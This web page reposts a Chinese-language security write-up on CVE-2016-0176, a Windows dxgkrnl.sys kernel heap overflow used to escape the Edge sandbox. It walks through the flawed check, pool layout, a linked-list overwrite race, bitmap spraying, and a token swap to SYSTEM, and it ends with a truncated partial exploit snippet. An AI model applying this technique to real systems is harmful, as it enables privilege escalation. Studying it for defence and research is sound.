<!DOCTYPE html>


<html xmlns:wb="http://open.weibo.com/wb">

<head>
  <meta charset="utf-8"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
  <meta property="wb:webmaster" content="ccd3e79934f3322d"/>
  <title>A Link to System Privilege - CVE-2016-0176 漏洞及利用详解</title>
  <meta name="keywords" content="漏洞文档,漏洞分析,安全技术"/>
  <meta name="description" content=""/>

  <meta name="HandheldFriendly" content="True"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>

  <link rel="shortcut icon" href="/static/images/favicon.ico">
  <link rel="stylesheet" type="text/css" href="/static/css/screen.css"/>
  <link rel="stylesheet" type="text/css" href="/static/css/font.css"/>
  <link rel="stylesheet"
        href="//libs.baidu.com/fontawesome/4.0.3/css/font-awesome.min.css">
  <link rel="stylesheet" type="text/css" href="/static/css/prism.css"/>
  <link rel="stylesheet" type="text/css" href="/static/css/monokai.css" media="screen"/>
  <link rel="stylesheet" type="text/css" href="/static/css/custom.css?t=20170821"/>
  <link rel="stylesheet" type="text/css" href="/static/css/print.css?t=20170821" media="print"/>
  <script>
    var _hmt = _hmt || [];
    (function () {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?ef67a70a7641da3b52452a05b3bbecae";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>


</head>

<body class="home-template">
<div class="weixin-share-img" style="display: none">
  <img src="/static/images/weixin-share.png" alt="Paper"/>
</div>

<div id="wrapper" class="">

<div id="sidebar">
  <button type="button" class="hamburger is-closed" data-toggle="offcanvas">
    <span class="hamb-top"></span>
    <span class="hamb-middle"></span>
    <span class="hamb-bottom"></span>
  </button>
  <div id="sidebar-content" class="inner">
    <h2 class="blog-title"><a href="/">Paper</a></h2>
    <h3 class="blog-description">安全技术精粹</h3>

    <form id="search" action="/">
      <button type="submit" style="background: #13313f; border: #13313f; position: absolute; right: -4px; margin-top: -3px;">
        <i class="fa fa-search search-button" style="position: absolute;right:10px; margin-top:6px;" > </i>
      </button>
      <input id="search-field" name="keyword" value="" placeholder="Search"/>

    </form>
    <div class="overlay"></div>
    <div id="sidebar-links">
      <ul id="subscription-links">
        <li><a target="_blank" href="/rss/"><i class="fa fa-rss"></i>RSS 订阅</a>
        </li>
        <li><a href="https://www.seebug.org/contribute/paper"><i
            class="fa fa-envelope-o"></i>投稿</a></li>
      </ul>
      <ul id="navigation">
        <li class="nav-" role="presentation"><a href="/"><i
            class="fa fa-angle-right"></i>首页</a></li>
        
  <li class="nav-" role="presentation"><a href="/category/vul-analysis/"><i
      class="fa fa-angle-right"></i>漏洞分析</a></li>

  <li class="nav-" role="presentation"><a href="/category/tools/"><i
      class="fa fa-angle-right"></i>安全工具&amp;安全开发</a></li>

  <li class="nav-" role="presentation"><a href="/category/information/"><i
      class="fa fa-angle-right"></i>情报分析</a></li>

  <li class="nav-" role="presentation"><a href="/category/experience/"><i
      class="fa fa-angle-right"></i>经验心得</a></li>

  <li class="nav-" role="presentation"><a href="/category/web-security/"><i
      class="fa fa-angle-right"></i>Web安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/bin-security/"><i
      class="fa fa-angle-right"></i>二进制安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/mobile-security/"><i
      class="fa fa-angle-right"></i>移动安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/paper-archive/"><i
      class="fa fa-angle-right"></i>纸篓</a></li>

  <li class="nav-" role="presentation"><a href="/category/prime/"><i
      class="fa fa-angle-right"></i>安全基础&amp;教学篇</a></li>


        <li class="nav-" role="presentation"><a href="/call-for-paper/"><i
            class="fa fa-angle-right"></i>如何投稿</a></li>
        <li class="nav-" role="presentation"><a href="https://paper.seebug.org/papers/"><i
            class="fa fa-angle-right"></i>归档文件</a></li>
      </ul>
      <ul id="sidebar-external">
      </ul>
    </div>

    <footer class="site-footer">
      <section class="copyright">Copyright @ 404 Team from Knownsec.</section>
    </footer>
  </div>
</div>

<main>
  <div class="main-inner">
    <section id="results"></section>
    
  <article class="">
    <header class="post-header">

      <h1 class="post-title">A Link to System Privilege - CVE-2016-0176 漏洞及利用详解</h1>

      <span class="post-print">
        <a href="javascript:window.print()">
        <i class="fa fa-print fa-2x" aria-hidden="true"></i>
        </a>
      </span>
      <section class="post-meta">
        <span class="post-time">
          <i class='fa fa-calendar'></i>
          <time datetime="2016-11-19" class="timeago">10 月 之前</time>
          <time datetime="2016-11-19" class="fulldate">十一月 19, 2016</time>
        </span>
        
          <br>
          <i class='fa fa-tag'></i>
          
            <a href="/category/bin-security/">二进制安全</a>
            
          
        








      </section>
    </header>

    <section class="post-content">
      <p>来源: <a href="http://keenlab.tencent.com/zh/2016/11/18/A-Link-to-System-Privilege/">腾讯科恩实验室官方博客</a></p>
<p>作者： <strong>Daniel King (@long123king)</strong></p>
<h3>如何攻破微软的Edge浏览器</h3>
<p>攻破微软的Edge浏览器至少需要包含两方面基本要素：浏览器层面的远程代码执行(RCE: Remote Code Execution)和浏览器沙箱绕过。 浏览器层面的远程代码执行通常通过利用Javascript脚本的漏洞完成，而浏览器的沙箱绕过则可以有多种方式，比如用户态的逻辑漏洞，以及通过内核漏洞达到本地提权(EoP: Escalation of Privilege)。</p>
<p>微软Edge浏览器使用的沙箱是建立在Windows操作系统的权限检查机制之上的。在Windows操作系统中，资源是可以在全系统范围内被共享的，比如一个文件或者设备可以在不同进程间被共享。由于有些资源里面包含着敏感信息，而另外一些资源的完整性则关乎系统的正常运转，如果被破坏了就会导致整个系统的崩溃。因此当一个进程在访问资源时需要进行严格的权限检查。当一个资源被打开时，主调进程的令牌信息会与目标资源的安全描述符信息进行匹配检查。权限检查由几个不同层面的子检查组成：属主身份及组身份检查，特权检查，完整性级别及可信级别检查，Capability检查等等。上一代的沙箱是基于完整性级别机制的，在沙箱里面运行的应用程序处于Low完整性级别，因此无法访问处于Medium或者更高级别的资源。微软的Edge浏览器采用的是最新一代的沙箱机制，这代沙箱是基于AppContainer的，运行在沙箱里的应用程序依然处于Low完整性级别，当它们尝试访问资源时，除了进行完整性级别检查，还需要进行Capabilities的检查，这种检查更加细腻以及个性化。关于权限检查机制的更多细节，可以参考我在ZeroNights 2015上的演讲：<a href="https://github.com/long123king/tokenext/blob/master/doc/Did_You_Get_Your_Token.pdf">Did You Get Your Token?</a></p>
<p>沙箱绕过的最常用的方法是通过内核态的漏洞利用，直接操作内核对象(DKOM: Direct Kernel Object Manipulation)以达到本地提权。</p>
<h3><a href="#CVE-2016-0176" title="CVE-2016-0176"></a>CVE-2016-0176</h3>
<p>这个漏洞是位于dxgkrnl.sys驱动中，是一个内核堆溢出漏洞。</p>
<p>被篡改的数据结构定义如下：</p>
<div class="codehilite"><pre><span></span><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_D3DKMT_PRESENTHISTORYTOKEN</span>
<span class="p">{</span>
    <span class="n">D3DKMT_PRESENT_MODEL</span>  <span class="n">Model</span><span class="p">;</span> <span class="c1">//D3DKMT_PM_REDIRECTED_FLIP      = 2,</span>
    <span class="n">UINT</span>                  <span class="n">TokenSize</span><span class="p">;</span> <span class="c1">// 0x438</span>
    <span class="n">UINT64</span>                <span class="n">CompositionBindingId</span><span class="p">;</span>

    <span class="k">union</span>
    <span class="p">{</span>
        <span class="n">D3DKMT_FLIPMODEL_PRESENTHISTORYTOKEN</span>        <span class="n">Flip</span><span class="p">;</span>
        <span class="n">D3DKMT_BLTMODEL_PRESENTHISTORYTOKEN</span>         <span class="n">Blt</span><span class="p">;</span>
        <span class="n">D3DKMT_VISTABLTMODEL_PRESENTHISTORYTOKEN</span>    <span class="n">VistaBlt</span><span class="p">;</span>
        <span class="n">D3DKMT_GDIMODEL_PRESENTHISTORYTOKEN</span>         <span class="n">Gdi</span><span class="p">;</span>
        <span class="n">D3DKMT_FENCE_PRESENTHISTORYTOKEN</span>            <span class="n">Fence</span><span class="p">;</span>
        <span class="n">D3DKMT_GDIMODEL_SYSMEM_PRESENTHISTORYTOKEN</span>  <span class="n">GdiSysMem</span><span class="p">;</span>
        <span class="n">D3DKMT_COMPOSITION_PRESENTHISTORYTOKEN</span>      <span class="n">Composition</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">Token</span><span class="p">;</span>
<span class="p">}</span> <span class="n">D3DKMT_PRESENTHISTORYTOKEN</span><span class="p">;</span>
</pre></div>


<p>我们把这个数据结构简称为”history token”，想要激发这个漏洞需要将关键成员变量按如下定义：</p>
<ul>
<li><strong>Model</strong>要设置为<strong>D3DKMT_PM_REDIRECTED_FLIP</strong>;</li>
<li><strong>TokenSize</strong>要设置为<strong>0x438</strong>;</li>
</ul>
<p>你大概已经猜到漏洞是存在在<strong>Token.Flip</strong>成员里面，该成员类型定义如下：</p>
<div class="codehilite"><pre><span></span><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_D3DKMT_FLIPMODEL_PRESENTHISTORYTOKEN</span>
<span class="p">{</span>
    <span class="n">UINT64</span>                                     <span class="n">FenceValue</span><span class="p">;</span>
    <span class="n">ULONG64</span>                                    <span class="n">hLogicalSurface</span><span class="p">;</span>
    <span class="n">UINT_PTR</span>                                   <span class="n">dxgContext</span><span class="p">;</span>
    <span class="n">D3DDDI_VIDEO_PRESENT_SOURCE_ID</span>             <span class="n">VidPnSourceId</span><span class="p">;</span>

    <span class="err">……</span>

    <span class="n">D3DKMT_DIRTYREGIONS</span>                        <span class="n">DirtyRegions</span><span class="p">;</span>
<span class="p">}</span> <span class="n">D3DKMT_FLIPMODEL_PRESENTHISTORYTOKEN</span><span class="p">;</span>
</pre></div>


<p>继续深入到<strong>DirtyRegions</strong>的类型定义：</p>
<div class="codehilite"><pre><span></span><span class="k">typedef</span> <span class="k">struct</span> <span class="n">tagRECT</span>
<span class="p">{</span>
    <span class="n">LONG</span>    <span class="n">left</span><span class="p">;</span>
    <span class="n">LONG</span>    <span class="n">top</span><span class="p">;</span>
    <span class="n">LONG</span>    <span class="n">right</span><span class="p">;</span>
    <span class="n">LONG</span>    <span class="n">bottom</span><span class="p">;</span>
<span class="p">}</span> <span class="n">RECT</span><span class="p">,</span> <span class="o">*</span><span class="n">PRECT</span><span class="p">,</span> <span class="n">NEAR</span> <span class="o">*</span><span class="n">NPRECT</span><span class="p">,</span> <span class="n">FAR</span> <span class="o">*</span><span class="n">LPRECT</span><span class="p">;</span> <span class="c1">// 0x10 bytes</span>

<span class="k">typedef</span> <span class="k">struct</span> <span class="n">_D3DKMT_DIRTYREGIONS</span>
<span class="p">{</span>
    <span class="n">UINT</span>  <span class="n">NumRects</span><span class="p">;</span>

    <span class="n">RECT</span>  <span class="n">Rects</span><span class="p">[</span><span class="n">D3DKMT_MAX_PRESENT_HISTORY_RECTS</span><span class="p">];</span> <span class="c1">// 0x10 * 0x10 = 0x100 bytes</span>

     <span class="c1">//#define D3DKMT_MAX_PRESENT_HISTORY_RECTS 16</span>

<span class="p">}</span> <span class="n">D3DKMT_DIRTYREGIONS</span><span class="p">;</span>
</pre></div>


<p>现在我们已经到达了最基本类型的定义, 看到一个成员是DWORD类型的<strong>NumRects</strong>, 另外一个是数组<strong>RECT</strong>，其中每个元素的类型是<strong>Rects</strong>, 这个数组是定长的，有16个元素的空间，每个元素0x10字节，每个这个数组的总长度是0x100字节。</p>
<p><img alt="" src="https://images.seebug.org/content/images/2016/11/edge_eop_img_1.png-w331s" /></p>
<p>上图展示了被篡改的数据结构的布局以及它们之间的关系，左面一栏是我们在调用 Win32 API 函数<strong>D3DKMTPresent</strong>时从用户态传入的数据结构，中间一栏是dxgkrnl.sys驱动接收到并维护的对应的数据结构，它是从左面一栏的数据结构中拷贝出来的，而右面一栏是内嵌定义在history token中的成员<strong>Token.Flip</strong>的数据结构。我们知道一个union的大小是由其成员中最大的成员大小决定的，而在这里<strong>Token.Flip</strong>恰好是union<strong>Token</strong>中最大的一个成员，也就是说整个history token数据结构是由<strong>Token.Flip</strong>中的内容填满直到结尾，这个特征非常重要，大大简化了利用的复杂度。</p>
<p>有了上面关于数据结构的知识，我们就可以很方便地理解这个漏洞了，现在展示的是引起漏洞的汇编代码片断：</p>
<div class="codehilite"><pre><span></span><span class="n">loc_1C009832A</span><span class="o">:</span> <span class="n">DXGCONTEXT</span><span class="o">::</span><span class="n">SubmitPresentHistoryToken</span><span class="o">(......)</span> <span class="o">+</span> <span class="mh">0x67</span><span class="n">B</span>
        <span class="n">cmp</span>     <span class="n">dword</span> <span class="n">ptr</span><span class="o">[</span><span class="n">r15</span> <span class="o">+</span> <span class="mi">334</span><span class="n">h</span><span class="o">],</span> <span class="mi">10</span><span class="n">h</span> <span class="c1">// NumRects</span>
        <span class="n">jbe</span>     <span class="n">short</span> <span class="n">loc_1C009834B</span><span class="o">;</span> <span class="n">Jump</span> <span class="k">if</span> <span class="n">Below</span> <span class="n">or</span> <span class="n">Equal</span><span class="o">(</span><span class="n">CF</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">|</span> <span class="n">ZF</span> <span class="o">=</span> <span class="mi">1</span><span class="o">)</span>
        <span class="n">call</span>    <span class="n">cs</span> <span class="o">:</span> <span class="n">__imp_WdLogNewEntry5_WdAssertion</span>
        <span class="n">mov</span>     <span class="n">rcx</span><span class="o">,</span> <span class="n">rax</span>
        <span class="n">mov</span>     <span class="n">qword</span> <span class="n">ptr</span><span class="o">[</span><span class="n">rax</span> <span class="o">+</span> <span class="mi">18</span><span class="n">h</span><span class="o">],</span> <span class="mi">38</span><span class="n">h</span>
        <span class="n">call</span>    <span class="n">cs</span> <span class="o">:</span> <span class="n">__imp_WdLogEvent5_WdAssertion</span>

<span class="n">loc_1C009834B</span><span class="o">:</span> <span class="n">DXGCONTEXT</span><span class="o">::</span><span class="n">SubmitPresentHistoryToken</span> <span class="o">(......)</span> <span class="o">+</span> <span class="mh">0x6</span><span class="n">B2</span>
        <span class="n">mov</span>     <span class="n">eax</span><span class="o">,</span> <span class="o">[</span><span class="n">r15</span> <span class="o">+</span> <span class="mi">334</span><span class="n">h</span><span class="o">]</span>
        <span class="n">shl</span>     <span class="n">eax</span><span class="o">,</span> <span class="mi">4</span>
        <span class="n">add</span>     <span class="n">eax</span><span class="o">,</span> <span class="mi">338</span><span class="n">h</span>
        <span class="n">jmp</span>     <span class="n">short</span> <span class="n">loc_1C00983BD</span>

<span class="n">loc_1C00983BD</span><span class="o">:</span> <span class="n">DXGCONTEXT</span><span class="o">::</span><span class="n">SubmitPresentHistoryToken</span> <span class="o">(......)</span> <span class="o">+</span> <span class="mh">0x6</span><span class="n">A5</span>
        <span class="n">lea</span>     <span class="n">r8d</span><span class="o">,</span> <span class="o">[</span><span class="n">rax</span> <span class="o">+</span> <span class="mi">7</span><span class="o">]</span>
        <span class="n">mov</span>     <span class="n">rdx</span><span class="o">,</span> <span class="n">r15</span><span class="o">;</span> <span class="n">Src</span>
        <span class="n">mov</span>     <span class="n">eax</span><span class="o">,</span> <span class="mi">0</span><span class="n">FFFFFFF8h</span><span class="o">;</span>
        <span class="n">mov</span>     <span class="n">rcx</span><span class="o">,</span> <span class="n">rsi</span><span class="o">;</span> <span class="n">Dst</span>
        <span class="n">and</span>     <span class="n">r8</span><span class="o">,</span> <span class="n">rax</span><span class="o">;</span> <span class="n">Size</span>
        <span class="n">call</span>    <span class="n">memmove</span>
</pre></div>


<p>在这片代码的入口处，r15寄存器指向的是history token结构的内存区域。代码首先从内存区域的0x334偏移处取出一个DWORD，并与0x10进行比较，通过上图我们可以看到取出的DWORD正是<strong>Token.Flip.NumRects</strong>成员，而0x10则是内嵌数组<strong>Token.Flip.Rects</strong>容量，所以这里比较的是<strong>Token.Flip.NumRects</strong>的值是否超出了<strong>Token.Flip.Rects</strong>数组的容量。如果你是在代码审查时遇到了这段代码，那么你可能会自言自语道大事不妙，微软已经意识到了这个潜在的溢出，并做了比较严格的检查。硬着头皮往下看，当溢出发生时，代码会以assertion的方式将这个异常情况记录到watch dog驱动，但是这个比对后的产生的两个代码分枝最终又都在loc_1C009834B处会合。可能你会想watch dog驱动有机会对代码溢出情况做出反应，通过bug check主动蓝屏(BSOD)，然而事实上什么都没有发生。 不管你对<strong>Token.Flip.NumRects</strong>这个变量设置什么值，代码都会最终执行到loc_1C009834B处的代码块，这个代码块对<strong>Token.Flip.NumRects</strong>值做了一些基础的算术运算，并且用运算的结果指定memcpy操作拷贝的长度。</p>
<p>为了更加直观地说明问题，把汇编代码改写成对应的C++代码：</p>
<div class="codehilite"><pre><span></span><span class="n">D3DKMT_PRESENTHISTORYTOKEN</span><span class="o">*</span> <span class="n">hist_token_src</span> <span class="o">=</span> <span class="n">BufferPassedFromUserMode</span><span class="p">(</span><span class="err">…</span><span class="p">);</span>
<span class="n">D3DKMT_PRESENTHISTORYTOKEN</span><span class="o">*</span> <span class="n">hist_token_dst</span> <span class="o">=</span> <span class="n">ExpInterlockedPopEntrySList</span><span class="p">(</span><span class="err">…</span><span class="p">);</span>

<span class="k">if</span><span class="p">(</span><span class="n">hist_token_src</span><span class="o">-&gt;</span><span class="n">dirty_regions</span><span class="p">.</span><span class="n">NumRects</span> <span class="o">&gt;</span> <span class="mh">0x10</span><span class="p">)</span>
<span class="p">{</span>
    <span class="c1">// log via watch dog assertion, NOT work in free/release build</span>
<span class="p">}</span>

<span class="k">auto</span> <span class="n">size</span> <span class="o">=</span> <span class="p">(</span><span class="n">hist_token_src</span><span class="o">-&gt;</span><span class="n">dirty_regions</span><span class="p">.</span><span class="n">NumRects</span> <span class="o">*</span> <span class="mh">0x10</span> <span class="o">+</span> <span class="mh">0x338</span> <span class="o">+</span> <span class="mi">7</span><span class="p">)</span> <span class="o">/</span> <span class="mi">8</span><span class="p">;</span>
<span class="k">auto</span> <span class="n">src</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span><span class="o">*</span><span class="p">)</span><span class="n">hist_token_src</span><span class="p">;</span>
<span class="k">auto</span> <span class="n">dst</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span><span class="o">*</span><span class="p">)</span><span class="n">hist_token_dst</span><span class="p">;</span>
<span class="n">memcpy</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">src</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
</pre></div>


<p>事情更加简单明了，无论我们给<strong>Token.Flip.NumRects</strong>指定什么样的值，一个内存拷贝操作在所难免，拷贝操作的源数据正是我们通过调用Win32 API <strong>D3DKMTPresent</strong>从用户态传入的buffer，拷贝操作的目标是通过调用<strong>ExpInterlockedPopEntrySList</strong>从内核堆上分配的buffer，而拷贝操作的长度是通过计算拥有<strong>Token.Flip.NumRects</strong>个元素的数组的长度，再加上数组成员在history token结构体中的偏移，以及因为对齐产生的padding长度。如果我们为<strong>Token.Flip.NumRects</strong>指定了一个大于0x10的长度，那么内核堆溢出就发生了，我们可以控制溢出的长度，以及溢出的前0x38字节内容(如上面介绍数据结构布局的图所示，在从用户态传入的数据中，我们可以控制history token结构后面的0x38字节数据)。</p>
<p>这个漏洞非常有意思，因为微软已经预见了它的存在却没能阻止它的发生，我们可以从中得到的教训是不要滥用编程技巧，除非你知道你自己在干什么，比如assertion机制。</p>
<h3><a href="#利用" title="利用"></a>利用</h3>
<p>对于一个堆利用来说，了解目标内存区域附近的内存布局至关重要，我们已经知道目标内存是通过<strong>ExpInterlockedPopEntrySList</strong>函数在内核态内存池中分配的。</p>
<p>通过简单调试，我们可以得到如下内存池信息：</p>
<div class="codehilite"><pre><span></span>kd&gt; u rip-6 L2
dxgkrnl!DXGCONTEXT::SubmitPresentHistoryToken+0x47b:
fffff801`cedb80fb call    qword ptr [dxgkrnl!_imp_ExpInterlockedPopEntrySList (fffff801`ced77338)]
fffff801`cedb8101 test    rax,rax
kd&gt; !pool rax
Pool page ffffc0012764c5a0 region is Paged pool
*ffffc0012764b000 : large page allocation, tag is DxgK, size is 0x2290 bytes
    Pooltag DxgK : Vista display driver support, Binary : dxgkrnl.sys
</pre></div>


<p>这是一个比较大的内存区域，大小为0x2290字节，因为这个大小已经超过了一个内存页的长度(一个内存页是0x1000字节)，所以它是以大页内存(Large Page Allocation)分配的，三个连续内存页被用来响应这次大页内存分配申请，为了节约内存，在0x2290之后的多余空间被回收并且链接到了Paged Pool的free list上面，供后续的小内存分配使用。在0x2290之后，会插入一个起到分隔作用的标记为Frag的内存分配。关于内核内存池及大页分配的详情，参考Tarjei Mandt的白皮书：<a href="https://media.blackhat.com/bh-dc-11/Mandt/BlackHat_DC_2011_Mandt_kernelpool-wp.pdf">Kernel Pool Exploitation on Windows 7</a>。下面展示的是在0x2290偏移附近的内存内容：</p>
<div class="codehilite"><pre><span></span>kd&gt; db ffffc0012764b000+0x2290 L40
ffffc001`2764d290  00 01 02 03 46 72 61 67-00 00 00 00 00 00 00 00  ....Frag........
ffffc001`2764d2a0  90 22 00 00 00 00 00 00-00 00 00 00 00 00 00 00  .&quot;..............
ffffc001`2764d2b0  02 01 01 00 46 72 65 65-0b 43 44 9e f1 81 a8 47  ....Free.CD....G
ffffc001`2764d2c0  01 01 04 03 4e 74 46 73-c0 32 42 3a 00 e0 ff ff  ....NtFs.2B:....
</pre></div>


<p>驱动dxgkrnl.sys中的<strong>DXGPRESENTHISTORYTOKENQUEUE::GrowPresentHistoryBuffer</strong>函数用来分配并管理一个链接history token的单链表。每个history token的长度是0x438字节，加上内存池分配的头部及padding一共0x450字节，所以0x2290大小的内存被平均分成8个history token，并且以倒序的方式链接在单链表中。驱动dxgkrnl.sys意图将单链表以look-aside list的方式来响应单个history token的内存分配请求。</p>
<p>单链表初始状态时如下所示：</p>
<p><img alt="" src="http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_2.svg" /></p>
<p>单链表在响应过一个history token分配请求后如下所示：</p>
<p><img alt="" src="http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_3.svg" /></p>
<p>单链表在响应过两个history token分配请求后如下所示：</p>
<p><img alt="" src="http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_4.svg" /></p>
<p>明确了溢出的目标内存处的内存布局，我们得到两种溢出方案：</p>
<h4><a href="#方案1：溢出0x2290偏移后面的复用的小内存分配空间" title="方案1：溢出0x2290偏移后面的复用的小内存分配空间:"></a>方案1：溢出0x2290偏移后面的复用的小内存分配空间:</h4>
<p><img alt="" src="http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_5.svg" /></p>
<h4><a href="#方案2：溢出相邻的单链表头部，转化成单链表利用" title="方案2：溢出相邻的单链表头部，转化成单链表利用:"></a>方案2：溢出相邻的单链表头部，转化成单链表利用:</h4>
<p><img alt="" src="http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_6.svg" /></p>
<p>方案1有诸多限制，因为我们只能控制溢出的前0x38字节内容，这意味着减掉padding空间，用于分隔的frag内存池分配项目的长度以及接下来的内存池分配的头部，我们没有多余发挥的空间。</p>
<p>方案2看起来很可行，虽然我们知道Windows内核现在已经强制对双链表进行完整性检查，但是对于单链表没有任何检查，因此我们可以通过覆盖单链表中的next指针达到重定向读写的目标。</p>
<p>为了进一步验证可行性，我们先在头脑里演绎一下方案2的种种可能。上面的几张图已经展示了从单链表中弹出两个history token的情形，此时我们可以溢出节点B，让它覆盖节点A的头部，然后我们将节点B压回单链表：</p>
<p><img alt="" src="http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_7.svg" /></p>
<p>当我们把节点A也压回单链表时，接下来会怎样，会不会如我们所料将单链表的读写重定向到被溢出覆盖的next指针处</p>
<p><img alt="" src="http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_9.svg" /></p>
<p>很遗憾并非如我们所料，这种重定向读写不会发生，因为当我们将节点A压回单链表时，覆盖的QWORD会恢复成指向节点B的指针：</p>
<p><img alt="" src="http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_10.svg" /></p>
<p>我们回到已经弹出两个节点的状态再尝试另外一种可能：
<img alt="" src="http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_11.svg" /></p>
<p>这次我们先将节点A压回单链表:</p>
<p><img alt="" src="http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_12.svg" /></p>
<p>然后我们溢出节点B，以覆盖节点A的头部，因为此时节点A已经被回收进单链表，所以不会再有任何操作可以将子节点A的头部恢复了。现在单链表已经被破坏了，它的第二个元素已经指向了溢出覆盖的QWORD所指向的内存处。:</p>
<p><img alt="" src="http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_13.svg" />
经过了上面的演绎，我们对方案2信心十足，现在我们就开始动手吧！看起来我们必须对单链表乱序调用push和pop，至少要有两次连续的pop，我做了如下的尝试：</p>
<h4><a href="#尝试1：循环调用D3DKMTPresent并传入可导致溢出的buffer。" title="尝试1：循环调用D3DKMTPresent并传入可导致溢出的buffer。"></a>尝试1：循环调用D3DKMTPresent并传入可导致溢出的buffer。</h4>
<p>结果失败了，经过调试发现每次都在重复pop节点A，使用后push节点A这个循环，根本不会产生乱序。原因很简单，循环调用D3DKMTPresent被逐个响应，所以我们必须同时调用它才能产生乱序。</p>
<h4><a href="#尝试2：在多线程中循环调用D3DKMTPresent并传入可导致溢出的buffer。" title="尝试2：在多线程中循环调用D3DKMTPresent并传入可导致溢出的buffer。"></a>尝试2：在多线程中循环调用D3DKMTPresent并传入可导致溢出的buffer。</h4>
<p>结果又失败了，经过一些简单的逆向分析，D3DKMTPresent的调用路径应该是被加锁保护了。</p>
<p>经历了两次挫败，不免开始怀疑人生，是否会出现两次连续的pop呢？然后很快就意识到绝对可行，肯定是我姿势不对，否则这相对复杂的单链表就退化成单个变量了，肯定有其他的内核调用路径可以激发单链表pop操作。我编写了一个windbg脚本记录每次push和pop操作，然后尝试打开一些图形操作密集的应用程序，只要发现了两次连续的pop就证明发现了第二条路径。经过简单的尝试，奇迹出现了，当我打开Solitaire游戏时，两次pop出现了，经过简单的调试，发现<strong>BitBlt</strong> API会触发第二条pop的内核路径。</p>
<h4><a href="#尝试3：在多线程中循环调用D3DKMTPresent并传入可导致溢出的buffer，同时在另外一批多线程中循环调用BitBlt。" title="尝试3：在多线程中循环调用D3DKMTPresent并传入可导致溢出的buffer，同时在另外一批多线程中循环调用BitBlt。"></a>尝试3：在多线程中循环调用D3DKMTPresent并传入可导致溢出的buffer，同时在另外一批多线程中循环调用BitBlt。</h4>
<p>这一次终于成功地将单链表中的next指针重定向到指定位置，达到了内核态任意地址写的目的。但是这种写的能力有限，很难重复，而我们想要通过DKOM方式偷换令牌需要多次内核读写，而这种矛盾在Pwn2Own 2016的3次尝试总时间15分钟的严苛比赛规则下显得更加突出，我们需要一些其他技巧。</p>
<h3><a href="#其他技巧" title="其他技巧"></a>其他技巧</h3>
<h4><a href="#如何达到可重复的内核态任意地址读写" title="如何达到可重复的内核态任意地址读写"></a>如何达到可重复的内核态任意地址读写</h4>
<p>为了达到这个目标，我使用win32k的位图bitmap对象作为中间目标。首先向内核态内存中spray大量的bitmap对象，然后猜测它们的位置，并试图通过上面的重定向写技巧修改它们的头部，当我成功地命中第一个bitmap对象后，通过修改它的头部中的buffer指针和长度，让其指向第二个bitmap对象。因此总共需要控制两个bitmap对象，第一个用来控制读写的地址，而第二个用来控制读写的内容。</p>
<p>再详细地讲，我一共向内核内存中spray了4GB的bitmap对象，首先通过喷射大尺寸的256MB的bitmap对象来锁定空间以及引导内存对齐，然后将它们逐个替换成1MB的小尺寸bitmap对象，这些对象肯定位于0x100000的边界处，就使得猜测它们的地址更加简单。</p>
<p>在猜测bitmap对象地址的过程中需要信息泄露来加快猜测速度，这是通过<strong>user32! gSharedInfo</strong>完成的。</p>
<h4><a href="#偷换令牌" title="偷换令牌"></a>偷换令牌</h4>
<p>有了可重复地任意地址读写的能力后，再加上通过sidt泄露内核模块的地址，我们可以方便地定位到<strong>nt!PspCidTable</strong>指向的句柄表，然后从中找出当前进程以及system进程对应的_EPROCESS结构体，进而找到各自的_TOKEN结构的地址，从而完成替换。</p>
<h4>部分利用代码</h4>
<div class="codehilite"><pre><span></span><span class="n">VOID</span> <span class="nf">ThPresent</span><span class="p">(</span><span class="n">THREAD_HOST</span> <span class="o">*</span> <span class="n">th</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">SIZE_T</span> <span class="n">hint</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">TRUE</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">HIST_TOKEN</span> <span class="n">ht</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span><span class="p">,</span> <span class="p">};</span>
        <span class="n">HtInitialize</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ht</span><span class="p">);</span>

        <span class="n">SIZE_T</span> <span class="n">victim_surf_obj</span> <span class="o">=</span> <span class="n">ThNextGuessedAddr</span><span class="p">(</span><span class="n">th</span><span class="p">,</span> <span class="o">++</span><span class="n">hint</span><span class="p">);</span>

        <span class="n">SIZE_T</span> <span class="n">buffer_ptr</span> <span class="o">=</span> <span class="n">victim_surf_obj</span> <span class="o">+</span> <span class="mh">0x200000</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">;</span>
        <span class="n">th</span><span class="o">-&gt;</span><span class="n">backupBufferPtr1</span> <span class="o">=</span> <span class="n">victim_surf_obj</span> <span class="o">+</span> <span class="mh">0x258</span><span class="p">;</span>
